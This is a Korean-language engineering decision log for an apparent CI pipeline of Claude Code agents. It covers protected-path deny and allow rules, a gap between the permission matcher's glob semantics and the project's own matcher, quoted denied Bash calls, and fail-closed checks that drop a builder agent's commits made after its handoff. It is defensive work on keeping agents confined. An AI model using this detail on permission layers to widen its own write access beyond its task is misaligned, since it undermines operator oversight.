`.factory/out/qa/**`를 제외한 전부를 이름으로 다시 세운다:
`bin/**`·`lib/**`·`actions/**`·`lessons/**`·`scenarios/**`(qa만 읽는 hold-out 시나리오 — builder가
읽지도 쓰지도 못해야 한다)·`node_modules/**`, `out/*`, `out/coverage/**`·`out/prove-wt/**`·
`out/classify-wt/**`, 그리고 최상위 파일 각각(`harness.toml`·`ci-settings*.json`·`roles.toml`·
`quarantine.toml`·`package.json`·`package-lock.json`). `out/*`가 `out/`의 **직계 파일만** 잡는 것이
이 열거의 전제다(게이트 판정 파일 `gates.json`·`unit.json`·`context.json`·`agents.jsonl`·
`test-env.pids`가 전부 거기 있다) — 글롭의 `*`는 `/`를 넘지 않는다(저장소의 `lib/glob.js`가 같은
의미이고, 테스트가 그 매처로 판정을 고정한다). 변형 파일은 여기서 `harness.toml` 한 줄만 뺀 것이다
(KTB-20의 계약 그대로).

**왜 negation이 아닌가**: deny 패턴에 "이것만 빼고"를 적을 수 있는 문법이 없고, 있더라도 allow가
deny를 이기지 못하는 이상 예외는 deny 목록 **밖**에서 만들 수 없다. 남는 길은 열거뿐이다. 열거는
조용히 늙으므로 — 새 `.factory` 하위 디렉터리가 생기면 아무도 모르게 쓰기 가능해진다 —
`templates.test.js`가 두 겹으로 못 박는다: (a) `templates/factory/factory/**`의 **모든** 템플릿 파일이
deny에 걸릴 것, (b) 템플릿 트리에 없는 런타임 경로(`bin`·`lib`·`out`·`node_modules`·`scenarios`와
`out`의 하위 디렉터리들)를 이름으로 적은 목록도 전부 걸릴 것, 그리고 `.factory/out/qa/**`의 어떤
경로도 **어느 deny에도 걸리지 않을 것**. 판정에는 Claude Code의 `**`/`*` 의미를 그대로 갖는
`lib/glob.js`의 `matchesAny`를 쓴다.

**기존 설치본**: `.factory/ci-settings*.json`은 manifest owner가 `factory`라 `factory init --upgrade`가
**통째로 교체한다** — 옛 통짜 줄은 그 한 번으로 사라진다(`install.test.js`가 옛 파일 픽스처로 그
경로를 고정한다). doctor의 `settings.ci-deny`/`settings.ci-harness`는 템플릿의 상위집합 검사라 새
열거를 그대로 요구하고, 아직 업그레이드하지 않은 저장소는 **FAIL**로 드러난다(그 상태의 qa는 증거를
남길 수 없으므로 WARN이 아니다).

**영향**: `templates/factory/factory/ci-settings.json`·`ci-settings-harness.json`,
`factory/hooks/block-dangerous.sh`(F9 주석), `templates/factory/claude/workflows/factory-implement.js`(주석),
스펙 §6.3. 테스트: `templates.test.js`(qa 카브아웃 2건 + KTB-20 계약 갱신), `install.test.js`(업그레이드
교체 1건), `doctor-factory.test.js`(열거 상위집합 1건). 코드 변경은 없다 — 고친 것은 **설정 한 줄**이고,
그 한 줄이 리뷰 라운드 전체를 거짓 거부로 만들고 있었다.

#### KTB-39 — `[runtime].setup`이 스스로 더럽힌 트리를 에이전트의 위반으로 읽고 있었다

**관측**(라이브, own-calendar #3 triage, 2026-09-14 12:25Z): 에이전트가 **아무것도 쓰지 않은**
triage가 `factory:needs-human`으로 떨어졌다. 사유는 `worktree dirty after triage (no-write stage):
client/pubspec.lock, client/analysis_options.yaml, …`. 원인은 세션 밖에 있었다 — 그 하네스의
`[runtime].setup`이 `flutter pub get`이고, 그 스텝은 `.factory/actions/setup` 안에서 **run-stage보다
먼저** 돌면서 추적 파일(`pubspec.lock`·생성 플러그인 등록부·`analysis_options.yaml`)을 다시 쓴다.
KTB-14의 클린 체크는 **결과만** 본다(그것이 그 체크의 미덕이다: 어떤 셸 모양으로 만들었든 잡는다) —
그래서 setup이 만든 diff와 에이전트가 만든 diff를 구별할 수가 없었다. 데모가 이 벽을 못 만난 것은
설계가 옳아서가 아니라 `npm ci`가 추적 파일을 건드리지 않기 때문이다.

**결정**: **기준선(baseline)을 찍는다.** 스테이지가 트리를 아직 아무것도 건드리지 않은 시점
(resetGates·브랜치 체크아웃·overlay **이전**)에 `git status --porcelain --untracked-files=all`과
경로별 diff 지문(`git diff HEAD --numstat`)을 한 번 찍어 `setup dirtied: <n> path(s): …` 한 줄로
기록하고, 쓰기 금지 스테이지의 클린 체크는 그 목록을 **면제**한다. 면제의 단위는 경로 이름이 아니라
**그때 그 모양**이다: 상태 문자가 바뀌었거나(unstaged → staged) 지문이 움직였으면 세션이 그 위에 더
쓴 것이므로 다시 더럽다 — 그러지 않으면 "setup이 건드린 파일이면 무엇을 써도 통과"라는 훨씬 큰
구멍이 열린다. 지문을 **다시** 읽지 못하면 "그대로다"를 증명할 수 없으므로 fail closed이고
(`factory:blocked`, 판정 불가), 스냅샷 자체가 실패하면 기준선이 없다 = 아무 경로도 면제되지 않는다
(예전 동작, 더 엄격한 쪽). 알려진 한계: 추가·삭제 줄 수가 정확히 같은 재편집은 numstat 지문으로
구별되지 않는다(경로마다 내용 해시를 뜨려면 프로세스를 그만큼 띄워야 한다 — 스테이지당 2회라는
이 자리의 예산과 맞지 않는다).

**implement는 면제가 아니라 복원이다.** 빌더는 `git add -A`로 커밋하므로 면제는 곧 "setup의 diff가
PR에 실린다"는 뜻이다. 그래서 빌더 앞에서 되돌린다 — 추적 경로는 `git checkout -- <paths>`,
setup이 만든 추적되지 않는 파일은 삭제(그 파일들은 `.gitignore`에 없다 — 있었다면 `git status`에
나오지도 않는다). **브랜치 체크아웃(2.3)보다도 먼저** 하는 이유가 둘 더 있다: ①
`git checkout -B <branch> origin/<branch>`는 충돌하는 로컬 수정이 있으면 거부한다(그 실패는
`factory:blocked`이었다), ② overlay(2.4)는 트리가 팩토리 소유 경로를 base와 다르게 들고 있으면
implement의 빌더를 아예 띄우지 않는데(KTB-37), setup이 그 경로를 건드리는 하네스에서는 그 판정이
에이전트와 무관한 이유로 서게 된다. 복원을 먼저 하면 overlay·drift·커밋 검사 모두가 기준선을
보지 않는다 — 이것이 "기준선을 그 검사들에서 뺀다"의 실제 구현이다. 복원 실패는 **멈춤이 아니다**:
판정 불가가 아니라 커밋이 지저분해지는 문제이므로 `setup restore: FAILED — …`를 기록하고 계속한다.

**대가와 그 경계**(순서 확인 결과): `[runtime].setup`은 잡당 **한 번만** 돈다 —
`.factory/actions/setup/action.yml`의 자기 스텝(`node .factory/bin/setup-env.js`)이고, 게이트는 같은
잡의 **뒤 스텝**에서 `run-stage.js`가 인프로세스로 돌린다(`bin/gates.js`도 setup을 부르지 않는다).
즉 **게이트 전에 setup이 다시 돌지 않는다**. 지워진 추적되지 않는 산출물이 빌드 입력이면 게이트
명령이 스스로 다시 만들어야 한다(`flutter test`는 그렇게 한다). 툴체인 자체는 영향받지 않는다 —
되돌리는 것은 워크트리의 추적 파일과 setup이 만든 비추적 파일뿐이고, `.dart_tool/`·`node_modules/`
같은 무시된 경로는 `git status`에 애초에 나오지 않아 기준선에 들어가지 않는다.

**doctor가 미리 말한다**: `runtime.setup-dirties-tree`(WARN). 판정은 순수 함수이고(표본은
"`git status` 한 덩어리"), 표본은 `--run` 모드에서만 만든다 — 이 저장소를 임시 디렉터리에 로컬
복제해 거기서 setup을 한 번 돌린다(작업 트리는 건드리지 않는다). `--offline`·`--no-run`에서는
돌리지 않고 "안 돌려 봤다"로 남긴다(setup은 몇 분이 걸릴 수 있다) — 안 돌려 본 것을 PASS로도
WARN으로도 적지 않는다. 권고 문장은 하네스 템플릿에도 그대로 들어간다: *prefer setup commands that
do not rewrite tracked files (pin toolchain versions; use lockfile-respecting installs)*.

**영향**: `factory/bin/run-stage.js`(`parseStatusEntries`·`snapshotSetupDirty`·`setupDirtyLine`·
`setupRestoreLine`·`makeRestoreSetupDirty`·`assertNoWriteStageClean`의 `baseline`·runStage 배선 두
자리·`deps.setupBaseline`/`restoreSetupDirty`), `factory/lib/doctor/harness.js`
(`checkSetupDirtiesTree`·`runSetupProbe`·`SETUP_DIRTY_NOTE`), `factory/cli/doctor.js`(프로브 배선),
`templates/factory/factory/harness.toml`(`[runtime]` 주석), 스펙 §4.2.1 step 1.5·step 4.
테스트: `factory/test/run-stage-setup-dirty.test.js`(신규 17건 — 파서·스냅샷·기록 줄·면제·에이전트
경로는 여전히 더럽다·더 쓴 기준선 경로·fail closed·복원 순서·복원 실패는 멈추지 않는다·쓰기 금지
스테이지는 복원하지 않는다), `factory/test/doctor-harness.test.js`(+4). 채택자 조치: `factory init
--upgrade`로 `.factory/bin/run-stage.js`·`.factory/lib/doctor/harness.js` 미러 갱신.

#### KTB-40 — KTB-36의 좁히기는 모자랐다: `.factory/out/*` 한 줄이 qa 디렉터리를 계속 덮고 있었다

**관측**(라이브, KTB 자기 자신 #3 — review R2, run 34840944244 트랜스크립트, 2026-09-14 12:50Z):
KTB-36이 머지된 **뒤에도** qa 리뷰어는 증거를 한 줄도 남기지 못했다. 이번에는 실패의 모양이 달랐다 —
훅이 막은 것이 아니라 **Claude Code의 권한 계층**이 Bash 호출 자체를 거절했다. 트랜스크립트의 9건:

```
Permission to use Bash with command mkdir -p .factory/out/qa/ has been denied
Permission to use Bash with command printf 'hello\n' > .factory/out/qa/test1.log … has been denied
Permission to use Bash with command node /tmp/qa3_repro.mjs > …/.factory/out/qa/3-repro-fix-after.log … has been denied
```

**무엇이 어긋났나**: KTB-36의 열거는 `.factory/out/*`를 남겼다. 두 가지가 겹쳤다.
1. **우리 매처로도 이미 틀렸다.** `.factory/out/*`는 "직계 자식"을 문다 — 그런데 **`qa` 디렉터리 자신이
   그 직계 자식이다**. `mkdir -p .factory/out/qa`의 대상이 정확히 그것이라, 거절당한 첫 명령이 첫 번째
   거절이었다. KTB-36의 테스트는 `out/qa/3-shot.png` 같은 **파일**만 물어봤기 때문에 이것을 못 봤다.
2. **Claude Code의 매처는 우리 가정보다 관대하다.** `printf … > .factory/out/qa/test1.log`까지 걸린 것을
   보면 그 계층의 `*`는 `/`를 넘는다(또는 접두 매칭이다). 우리 `globToRegex`의 계약("`*`는 `/`를 넘지
   않는다")은 **우리 코드 안에서만** 참이고, 생성물의 소비자에게는 통하지 않았다. 생성기의 출력이 남의
   매처에 먹히는데 우리 매처로만 검증하면, 그 검증은 고장을 영원히 못 본다.

**결정**:
(a) `FACTORY_ENUM`에서 `.factory/out/*`를 **하위 디렉터리에 닿을 수 없는 파일 패턴**들로 편다 —
`out/*.json`·`*.jsonl`·`*.pids`·`*.md`·`*.log`·`*.txt`. 이것이 run-stage·게이트·진행·`loaded.json`·
`agents.jsonl`·`test-env.pids`가 `.factory/out/` 직계에 쓰는 전부다(`grep '\.factory/out/'`로 열거).
확장자가 없는 `.factory/out/qa`는 **어떤 읽기에서도** 이 중 무엇과도 맞지 않는다. 중첩 deny
(`coverage/**`·`prove-wt/**`·`classify-wt/**`)는 그대로다.
(b) 두 ci-settings 템플릿에 `permissions.allow`를 넣어 카브아웃을 **적극적으로 선언한다**:
`Write/Edit(.factory/out/qa/**)`, `Bash(mkdir -p .factory/out/qa*)`, `Bash(mkdir -p ./.factory/out/qa*)`.
이것은 **선언이지 우선권이 아니다** — Claude Code에서 deny는 여전히 allow를 이기고, 그래서 (a)가
필요했다. allow가 따로 필요한 이유는 반대편이다: `--permission-mode dontAsk`에서 allow에 걸리지 않는
도구 호출은 묻지 않고 **거절**된다(ADR-020 KTB-13이 확인한 사실). ADR-019는 allow를
`.claude/settings.json`에 두었지만 CI 세션은 `--settings .factory/ci-settings.json`도 함께 읽는다.
(c) **테스트는 두 매처로 같은 질문을 한다**(`factory/test/protected-paths-out-qa.test.js`): 저장소의
`globToRegex`와, `*`가 `/`를 넘는 **관대한** 두 번째 매처(관측된 거절이 성립하는 가장 단순한 의미).
`.factory/out/qa`·`.factory/out/qa/`·`./.factory/out/qa`·`out/qa/x.png`·`out/qa/a/b.log`가 두 읽기
모두에서 어느 deny에도 걸리지 않아야 하고, 직계 파일 14종은 전과 같이 전부 걸려야 한다.

**함께 고친 것 — 훅 테스트가 세션 env를 물려받고 있었다**: `lib/exec.js`의 `run()`은 `process.env`
위에 `opts.env`를 얹는다. 그래서 `hooks.test.js`를 **팩토리 스테이지 안에서** 돌리면
(`run-stage.js`가 `claude -p`의 env에 `FACTORY_STAGE`를 심고, 그 세션이 `npm test`를 부른다)
"세션 밖에서는 브랜치 이동이 사람의 평범한 동작이다"(ADR-023 Task 8b)가 **환경 때문에** 빨개진다.
판정이 테스트의 진술이 아니라 실행 위치로 결정되면 그 테스트는 아무것도 고정하지 않는다. 이제
`factory/test/helpers/hook-env.js`의 `baseEnv()`가 `FACTORY_STAGE`·`FACTORY_HARNESS_ISSUE`·
`CLAUDE_PROJECT_DIR`를 지운 환경을 만들고, 모든 훅 spawn이 `replaceEnv: true`로 그것을 쓴다 —
테스트가 명시적으로 준 값만 얹힌다. 같은 표를 `FACTORY_STAGE` 없이(허용)·세운 채로(차단) 두 번
돌리는 테스트가 그 대조를 한 자리에 못 박는다. `doctor-factory.test.js`의 실제 훅 실행에도 같은
헬퍼를 걸었다 — `record-agents.sh`는 `CLAUDE_PROJECT_DIR`를 읽어 `agents.jsonl`을 쓰므로, 상속되면
tmp cwd가 아니라 **진짜 저장소**에 기록이 남는다.

**영향**: `factory/lib/protected-paths.js`(`FACTORY_ENUM` + 주석), `factory/cli/install.js`
(`renderCiSettings` 주석 — allow는 그대로 통과), `templates/factory/factory/ci-settings.json`·
`ci-settings-harness.json`(`permissions.allow` 신설), `.factory/` 미러(생성물 재생성).
테스트: `factory/test/protected-paths-out-qa.test.js`(신규 6건), `templates.test.js`(qa 목록에
디렉터리 자신 추가 + out 열거 갱신), `install.test.js`(업그레이드 교체 pin 갱신),
`hooks.test.js`(`baseEnv()` 전면 적용 + 스테이지 대조 1건), `doctor-factory.test.js`(격리 실행기).
채택자 조치: `factory init --upgrade`로 `.factory/ci-settings*.json`·`.factory/lib/protected-paths.js`
갱신 — 하지 않으면 doctor의 `protected.parity`가 FAIL로 말한다.

#### KTB-43 — 핸드오프를 쓴 **뒤에** 붙은 툴체인 재생성 커밋 하나가 라운드를 needs-human으로 보냈다

**관측**(라이브, own-calendar #3 implement, 2026-09-14 13:32Z): KTB-38의 base 머지(`fe11981`) 위에서
빌더가 자기 작업을 커밋하고(`bfff638`) implement 핸드오프를 `head_sha=bfff638`로 썼다. 그다음 자기
검증(`flutter test`)을 돌렸고, 그 명령이 툴체인 파일을 다시 만들자 그것을
`f1909c6 "chore(3): reconcile flutter toolchain drift left by verification run"`으로 **또 커밋했다**.
그 커밋이 건드린 파일은 `client/analysis_options.yaml`·`client/{linux,windows}/flutter/generated_plugin*`·
`client/macos/Flutter/GeneratedPluginRegistrant.swift` — KTB-39가 스테이지 맨 앞에서 찍는 `setup_dirty`
기준선 집합 **그대로**다. `requirements.js:69`가 `implement head_sha bfff638 != branch head f1909c6`으로
`factory:awaiting-review` 전이를 거부했고, 이슈는 라벨만 `factory:needs-human`으로 옮겨 앉았다.

**판단**: fail-closed는 옳다. 검증된 sha와 머지될 sha가 다르면 그 GREEN은 이 트리의 이야기가 아니고,
그 규칙은 그대로 둔다. 틀린 것은 **복구가 사람의 일이었다는 것**이다 — 이 차이는 에이전트가 한 판단이
아니라 툴체인이 남긴 부스러기이고, 부스러기를 치우는 데 사람의 라운드를 쓰는 것은 이 공장의 계약이
아니다. 그리고 사유 문장이 sha 두 개뿐이라(`bfff638 != f1909c6`) 사람도 무슨 일이 있었는지 알 수 없었다.

**결정 ① — 스테이지가 되돌린다(드리프트 전용일 때만).** 세션이 끝난 직후, **게이트(5)보다 먼저**,
implement는 세션 산출물의 `head_sha`(`implementHeadShaOf` — `verifyStage`와 같은 추출기를 자리표시자
gates로 한 번 더 돌린다)와 브랜치 head를 비교한다. head가 그 sha의 **자손**이고
`git diff --name-only <handoff>..<head>`의 **모든** 파일이 1.5의 기준선이거나 `[runtime].setup_generated`
글롭이면: `git reset --hard <handoff sha>` → `git push --force-with-lease=<branch>:<head> origin <branch>`
(Task 8b 이후 브랜치는 스테이지의 것이다) → run 기록 `dropped post-handoff drift commit(s): <shas> (<n> files: …)`
+ 이슈 코멘트 마커 `<!-- factory-drift-dropped … -->` 한 줄 → 계속. **게이트보다 먼저인 이유**가
설계의 요점이다: `gates.json`의 `head_sha`는 게이트가 돈 시점의 HEAD이고 전이 요구조건이 그것을 브랜치
head에 다시 묶으므로(`gatesGate`), 게이트 뒤에 되돌리면 한 거부(`head_sha != branch head`)를 다른 거부
(`gates file describes … , PR head is …`)로 바꿀 뿐이다. **리스 없는 force는 없다**: `<head>`는 방금
우리가 읽은 커밋이고, 그 사이 누가 브랜치를 움직였으면 push가 거절되며 그 거절은 실패가 아니라
판정이다(되돌릴 대상이 우리가 본 그것이 아니다) — `--force`로 바꾸지 않고 거부한다.

**결정 ② — 그 밖은 전부 거부하되, 파일 이름을 실어서.** 드리프트 밖의 파일이 하나라도 섞였으면
되돌리지 않는다. 그건 빌더가 실제로 한 작업이고, 스테이지가 남의 작업을 말없이 지우는 자리는 이
저장소에 없다. 사유는 `post-handoff commits touch non-drift paths: <files>`이고, **핸드오프를 쓴
뒤에** 낸다 — 사람이 받는 이슈에는 이 라운드가 무엇을 했는지가 남아 있어야 한다. 자손이 아닌 head도
같은 자리다(설명할 수 없는 브랜치는 다시 쓰지 않는다).

**결정 ③ — 빌더에게 규칙을 준다(둘이다).** 프롬프트에는 "무엇을 커밋하지 않는가"만이 아니라
"언제까지만 커밋하는가"도 있어야 한다: 재생성 파일을 커밋하지 말 것, 그리고 핸드오프를 쓴 뒤에는
아무것도 커밋하지 말 것. 검증이 트리를 더럽혔으면 **그냥 둔다** — 커밋되지 않은 파일은 PR에 실리지
않고, 다음 런의 KTB-39 복원이 치운다. 그 목록은 산문이 아니라 이번 런의 사실이어야 하므로
(`setup_dirty`), 스테이지가 찍은 기준선이 `context.json` → `loaded.json` → 워크플로의 규칙 8로
실려 간다(워크플로 스크립트는 파일을 읽을 수 없다, §4.2.3). 보호 경로 블록은 규칙 9로 한 칸 밀렸다.

**새 하네스 키**: `[runtime].setup_generated`(선택, 기본 빈 배열). 기준선은 **setup이 더럽힌 것**만
담는데, own-calendar의 재생성물은 그보다 **늦게**(`flutter test`에서) 돌아온다 — 그 하네스가 그 사실을
직접 적을 자리다. 넓히는 것은 위험을 늘리지 않는다: 이 글롭은 "떨어뜨려도 되는가"만 정하고, 진짜
작업이 섞인 커밋은 여전히 떨어지지 않는다(결정 ②).

**반대 순서는 이미 닫혀 있다**(확인): 세션이 트리를 더럽혀 두고 **커밋하지 않은** 채 끝난 경우 —
HEAD는 여전히 핸드오프의 sha이므로 이 규칙은 아무것도 하지 않고, implement는 유일한 쓰기 스테이지라
클린 체크를 돌지 않으며(그 diff는 PR에 실리지 않는다), 다음 런의 KTB-39 복원이 빌더 앞에서 치운다.
테스트가 그 경로를 명시적으로 고정한다.

**영향**: `factory/bin/run-stage.js`(`implementHeadShaOf`·`isDriftPath`·`driftDroppedLine`·
`driftDroppedMarker`·`driftRefusedReason`·`makeDropPostHandoffDrift`·runStage 배선 두 자리·
`deps.handoffHeadSha`/`dropPostHandoffDrift`/`buildContext({setupDirty})`), `factory/lib/context.js`
(`buildContext`의 `setupDirty` → `ctx.setup_dirty` → `loadedFor`), `templates/factory/claude/workflows/
factory-implement.js`(규칙 8 신설, 보호 블록 8→9), `templates/factory/claude/agents/factory-builder.md`
(`You must not` 2건 + Lens 7), `templates/factory/factory/harness.toml`(`[runtime].setup_generated` 주석),
스펙 §4.2.1 step 4. `requirements.js`는 **바뀌지 않았다** — 고친 것은 그 앞이다.
테스트: `factory/test/run-stage-drift.test.js`(신규 14건 — 산출물 sha 추출·드리프트 전용 드롭·글롭
확장·소스 파일 혼입 거부·되돌릴 것 없음·자손 아님·리스 실패·기록 줄과 마커·게이트보다 먼저라는 순서·
핸드오프는 그대로 나간다·비커밋 드리프트·implement 전용), `workflows.test.js`(+1), `agent-md.test.js`(+1),
`context.test.js`(+1). 채택자 조치: `factory init --upgrade`로 `.factory/bin/run-stage.js`·
`.factory/lib/context.js` 미러와 워크플로·빌더 프롬프트 갱신.

### ⑥ 관찰 — O1~O12, O14·O15, O20·O23·O24, G1

결함으로 승격하지 않았지만 판결의 근거이거나 앞으로의 판결에 필요한 사실들. 전부 `docs/factory/dogfood/2026-09-12-demo.md`·`2026-09-12-ktb.md`·`task-6-prep-report.md`에서 실측됐다(출처 표기).

- **O1**(Task 3, 데모) — plan이 스스로 사람 개입을 선행 조건으로 걸었다: `pg` 의존성 추가가 `package.json`(보호 경로)에 걸려 "`pg` 한 줄만 담은 `factory:harness` PR을 사람이 머지한 뒤 이슈를 claim한다"는 계획을 냈다. 그린필드 첫 기능 이슈가 사람 머지를 요구하는 것은 §11 그린필드 흐름의 실제 마찰이다 — 픽스처가 런타임 의존성을 미리 깔아 둘지, `[protected]`를 tier별로 열지는 아직 판단이 필요하다(미결).
- **O2**(Task 3, 데모) — `docs/features/001-create-note.md`의 `issue: null`을 채우지 못했다(`main` 보호, 로컬 push 불가). 컨텍스트 로더가 이슈 본문의 `Spec: …` 줄에서 경로를 뽑으므로 파이프라인 영향은 없었다 — 문서 프런트매터의 역참조만 비어 있다.
- **O3**(Task 3, 데모) — 라벨 이벤트 하나에 워크플로 5개가 뜬다(`issues: labeled`에는 라벨 필터가 없다). 관측된 3회 모두 올바른 스테이지가 슬롯을 잡았지만 `cancel-in-progress: false`에서는 늦게 들어온 pending이 먼저 들어온 pending을 취소하는 잠재 레이스였다 — 이 관찰이 실제로 실현되고 해소된 것이 **KTB-8**이다(④).
- **O4**(Task 3, 데모) — 세션 트랜스크립트가 아티팩트에 없어 원인 추적을 `.factory/out/plan.json`의 `result` 역추적으로 해야 했다. **KTB-7**의 첫 수정은 업로드 경로가 `~`로 시작해 실제로는 아무것도 올리지 않아 무효였고("고쳤다"와 "동작한다" 사이에 러너 확인이 없었다), **KTB-10**에서 dispatch(M1)가 실제로 뜨는지 run `34696709110`으로 라이브 확인해 간극을 한 번 메웠다.
- **O5**(Task 3, 데모) — `factory status`가 `_retro.md` 상태 파일을 이슈처럼 센다(`- #_retro $0 · 0 runs`). 표시 잡음(수정 안 함, 낮은 우선순위로 이월).
- **O6**(Task 3, 데모) — **락 프로토콜이 한 번 깨졌다.** 컨트롤러가 락을 반납한 사이 다른 에이전트가 미커밋 변경(`factory/lib/stage-artifact.js` import)을 자기 KTB-6 커밋(`9c3346d`)에 함께 담아, HEAD가 잠시 untracked 파일을 import하는 상태가 존재했다. 명시 경로 `git add`만으로는 같은 파일을 둘이 건드릴 때를 못 막는다 — 파일 단위 소유권이나 워크트리 분리가 필요하다는 결론이며, 이후 "**한 번에 하나의 KTB-writing 에이전트만**"으로 운영 규칙을 좁혔다(progress.md O6 ruling).
- **O7**(Task 3, 데모) — heartbeat 정상(10분 간격, 실측 갱신 확인). 37분짜리 스테이지가 죽었는지 살았는지 구분됐다 — sweeper 설계의 전제가 실제로 성립한다.
- **O8**(Task 3, 데모) — **취소된 런은 흔적을 남기지 않는다.** KTB-8이 취소한 plan 런은 `cancelled`로 1초 만에 끝나 잡 로그도 아티팩트도 코멘트도 없었다. "무슨 일이 있었나"의 유일한 창구가 `gh run list`이고 그마저 90일이 지나면 사라진다. 재점화 마커 코멘트(KTB-8)가 최소한 "스위퍼가 밀었다"는 사실은 이슈에 남기지만, 취소 자체는 여전히 이슈에 기록되지 않는다.
- **O9**(Task 3, 데모) — **업그레이드 커밋 제목이 실제 배포된 KTB sha를 말해야 한다.** 데모 PR #3의 제목은 `init --upgrade to KTB f12a174`였지만 내용은 f8b0439까지였다. 제목의 sha를 믿고 "그 수정은 아직 안 갔다"고 읽으면 같은 결함을 두 번 조사한다 — 업그레이드 PR 제목의 sha는 `git rev-parse HEAD`로 그 자리에서 찍어야 한다(운영 규칙, 자동화 안 함).
- **O10**(Task 4, 데모) — 이슈를 `--label backlog`로 생성하면 그 자체가 `issues: labeled`를 쏴 워크플로 5개 중 매칭되는 것이 없어 5개 skipped 런이 뜬다(Task 4의 이슈 4건 생성으로 20개). 노이즈·러너 분(分) 낭비일 뿐 정지·오탐은 아니다 — `on.issues.labeled`는 라벨 이름으로 필터할 수 없으므로(GitHub 미지원), 이슈 생성을 `workflow_dispatch`-only 트리거로 옮기는 안이 후보로 남는다(설계 메모, 미채택).
- **O11**(라운드 3, 데모) — 전체 판결(운영 규칙)은 바로 다음 항목.
- **O12**(라운드 3~4, 데모) — `usage.js`/`harvest.js`의 토큰 합산이 `input_tokens`만 세어 프롬프트 캐싱 세션의 실제 입력을 대부분 놓치고 있었다(`_retro.md`가 "input 50"으로 찍은 런의 실제 입력은 캐시 포함 170,000+). `cache_creation_input_tokens`·`cache_read_input_tokens`를 input 합계에 포함하고 `renderStatus`/`statsBlock` 라벨을 `input(+cache)`로 고쳤다(원본 필드는 그대로 남긴다) — **KTB-19 커밋(23ef1df)에 함께 실렸다**(별도 KTB 번호를 받지 않았다: 표시 형식 수정으로 판단됐다).
- **O13** — 미배정(번호만 비워 둔다: 라운드 4에서 후보로 잡혔다가 별도 결함으로 승격되지 않았다).
- **O14**(라운드 4, 데모) — **`:issue` 스킬이 그리는 이슈에서는 `docs` tier가 영영 도달 불가능했다.** `templates/know-thy-build/issue.md`는 이슈 종류를 가리지 않고 회귀 가드 `test_NNN_<slug>`를 하나 초안에 넣는다. README만 고치는 이슈 #18에서도 그랬고, 그 가드 때문에 diff에 테스트 파일이 들어가 triage는 CHARTER의 tier 표("`docs` = diff가 `docs/**`, `*.md`만")대로 `standard`로 판정했다. 문서 한 줄을 고치는 데 리뷰어 로스터 전체와 `full` 게이트가 붙는다 — tier 표에 `docs`가 있는데 `:issue` 경로로는 아무도 그것을 만들 수 없었다는 뜻이다. **판결**: Impact paths가 **전부** 문서 경로(`*.md`, `docs/**`)면 스킬은 가드 테스트 없이 `done_when`을 쓰고(사람이 읽어 확인하는 문장 + `<!-- docs-only: … -->` 마커), 사용자에게 "docs-only → 회귀 가드 없음, tier는 docs"라고 한 줄로 말한다. 문서 외 경로가 **한 줄이라도** 섞이면 예외는 적용되지 않는다. tier를 정하는 것은 여전히 triage다 — 스킬이 하는 일은 tier를 고르는 것이 아니라 **Impact paths가 무엇인지 정확히 말하는 것**이고, 가드 테스트는 그 사실을 조용히 왜곡하고 있었다. 결함이 아니라 스킬 템플릿의 판단 규칙 하나라서 KTB 번호를 받지 않았다(`skills-ops-a.test.js` 1건으로 고정).
- **O15**(라운드 4, 데모) — 첫 전체 retro가 자동 생성한 `factory:harness` 이슈 #15("promote to M2")의 승격 PR #20에 **승격이 들어 있지 않았다**: builder가 `.factory/harness.toml`·컴포즈·e2e 설정을 하나도 쓸 수 없어 전부 사람에게 미뤄졌다. 전체 판결은 ⑤의 **KTB-20**이다.

- **O20**(라운드 8, 데모) — **sweeper가 같은 스테이지를 네 번 다시 밀었다**(#15 review: 05:14·05:45·07:42·08:25). 재점화 dedupe가 시간 창이라 30분마다 다시 발화했고, 매번 ~$10짜리 리뷰가 뜰 수 있었다(하트비트 가드가 실제 중복 실행은 막았다). 상한 자체는 **KTB-28 (d)**(이슈+스테이지당 2회)로 이미 닫혔고, 이 관찰이 남긴 것은 그 옆의 사실이다: **잘린 런의 blocked은 "환경/크리덴셜"이 아니다.** #15를 죽인 것은 잡 취소·타임아웃이었는데 sweeper는 그것을 크리덴셜 문제와 같은 문장으로 사람에게 넘겼다 — 사람이 틀린 곳을 먼저 본다. 판결: `factory-blocked-origin` 마커가 **원인 등급**(`api-error|timeout|cancelled|gates|undecidable|other`)을 싣고, 취소 origin은 R 예산을 쓰지 않고 그 취소마다 한 번 다시 밀리며, 에스컬레이션 사유가 원인을 이름으로 말한다(ADR-020 KTB-30의 "함께(O20)" 항목에 구현이 실렸다).
- **O23**(라운드 8, 데모, 2026-09-13 08:50~08:55Z) — **GitHub API 불안정 창.** 5분 사이에 세 종류가 겹쳤다: 라벨 뮤테이션 실패 2건(`GraphQL: Something went wrong while executing your query`, `EOF`), `gh issue edit --add-label`의 `failed to update 1 issue`, 그리고 `gh workflow run`의 HTTP 500. 같은 창에서 **REST 엔드포인트(`gh api`)는 정상이었다** — 관측자가 손으로 친 `gh api -X POST repos/…/issues/2/labels`가 성공했고, 그 라벨 변경이 `issues: labeled`를 제대로 쏴 implement가 떴다(dispatch가 500으로 실패한 뒤였는데도). 이 사실이 KTB-30의 폴백 설계를 정한다: 재시도만으로는 부족하고 **다른 경로**가 필요하다. GitHub의 이런 창은 "다시 걸면 되는" 것이 아니라 "이 API만 아픈" 것일 수 있다.
- **O24**(라운드 9, 데모, 2026-09-13 09:06Z) — **sweeper cron은 믿을 수 없다.** `factory-sweeper.yml`의 schedule 런이 05:13Z 이후 4시간 동안 한 번도 뜨지 않았고, 그 전 간격도 2~5시간이었다(GitHub은 활동이 적은 저장소의 cron을 임의로 늦춘다). KTB-26의 "스테이지 뒤 quick sweep"이 실질 안전망이지만, 같은 창에서 세 이슈의 런이 전부 GitHub 큐에 멈춰 있으면(좀비 큐, KTB-31의 발단) 어떤 스테이지도 끝나지 않으니 아무것도 쓸지 않는다. 판결: 스펙에 "cron은 최후 수단"으로 적고, 사람 도구로 `gh workflow run factory-sweeper.yml`을 `unstick`/`status` 문서에 안내한다(1.1). 같은 라운드의 비용 스냅샷: 누계 $398.48 / 166 runs(list-price 환산).
- **O25**(라운드 11, 데모, 2026-09-13 14:26Z) — **턴 상한이 "잡 타임아웃"으로 보고됐다.** #15 plan이 40분 뒤 `claude -p hit max turns (13)`로 끝났고(마지막 도구 결과가 Workflow 백그라운드 접수증 — 결과가 턴 안에 도착하지 않음), `factory-blocked-origin`은 `cause=timeout`, 에스컬레이션 문구는 "blocked (job timed out)"이었다. 원인 등급(O20)이 잘못 물렸다: 턴 상한은 시간이 아니라 **판단 불가**에 가깝다. 1.1 이월 3번.

#### O11 — 스테이지가 도는 동안 대상 저장소를 업그레이드하지 않는다

